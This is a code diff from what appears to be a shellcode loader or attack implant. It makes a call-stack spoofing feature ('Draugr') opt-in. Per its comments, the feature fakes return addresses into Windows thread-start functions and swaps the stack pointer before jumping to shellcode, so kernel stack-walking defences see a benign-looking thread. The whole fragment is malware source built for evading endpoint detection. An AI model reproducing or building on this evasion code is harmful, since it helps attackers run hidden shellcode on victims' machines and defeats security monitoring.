@@ -245,12 +245,17 @@ int Main(VOID) {
     // Store target + gadget for the ASM callback wrapper
     SetSpoofTarget(pExec, pCallGadget);
 
-    // #9 Draugr MVP: build a 1 MB synthetic stack whose top contains
-    // three fake return addresses pointing into RtlUserThreadStart /
-    // BaseThreadInitThunk / NtWaitForSingleObject. SpoofCallback will
-    // swap RSP to this buffer before jumping to shellcode, so kernel
-    // call-stack walkers see a plausible fresh-thread chain.
+    // #9 Draugr MVP (opt-in, disabled by default — see Common.h).
+    // Builds a 1 MB synthetic stack whose top contains three fake
+    // return addresses pointing into RtlUserThreadStart /
+    // BaseThreadInitThunk / NtWaitForSingleObject. SpoofCallback swaps
+    // RSP to this buffer before jumping to shellcode so kernel call-
+    // stack walkers see a plausible fresh-thread chain.
+#ifdef ENABLE_SYNTHETIC_STACK
     SetSpoofStack(BuildSyntheticStack(&WinApis));
+#else
+    SetSpoofStack(NULL);
+#endif
 
     // pNtdll needed below for thread-pool fallback path
     BYTE xNtdll[] = XSTR_NTDLL_DLL;
